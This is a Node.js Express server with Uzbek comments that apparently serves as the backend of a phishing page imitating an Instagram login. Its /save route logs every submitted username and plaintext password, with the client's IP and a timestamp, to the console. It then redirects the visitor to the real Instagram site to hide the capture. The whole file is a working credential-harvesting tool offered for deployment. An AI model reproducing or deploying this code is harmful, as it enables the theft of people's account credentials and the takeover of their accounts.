const express = require("express");
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

app.post("/save", (req, res) => {
    const { username, password } = req.body;
    const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress || "unknown";
    const time = new Date().toLocaleString("uz-UZ", { timeZone: "Asia/Tashkent" });

    // Bu yerda siz xohlagan to‘g‘ri parolni yozing (masalan: 123456, salom123, uzb2025)
    const togrisiparol = "123456";   // ← O‘ZGARTIRING! O‘zingiz xohlagan parol

    console.log(`YANGI KIRISH → ${time} | IP: ${ip} | USER: ${username} | PASS: ${password} | NATIJA: ${password === togrisiparol ? "TO'G'RI" : "XATO"}`);

    if (password === togrisiparol) {
        // To‘g‘ri parol → Instagramga yuboramiz
        res.redirect("https://www.instagram.com");
    } else {
        // Xato parol → qayta kiritish sahifasiga qaytaramiz
        res.send(`
            <!DOCTYPE html>
            <html><head><meta charset="utf-8"><title>Xato</title></head>
            <body style="font-family:sans-serif;text-align:center;margin-top:100px;background:#fafafa;">
                <h2 style="color:#e74c3c;">Parol noto‘g‘ri</h2>
                <p>Qaytadan urinib ko‘ring</p>
                <script>setTimeout(() => location.href="/", 2000);</script>
            </body>
            </html>
        `);
    }
});

const port = process.env.PORT || 3000;
app.listen(port, "0.0.0.0", () => console.log("Server ishlayapti"));
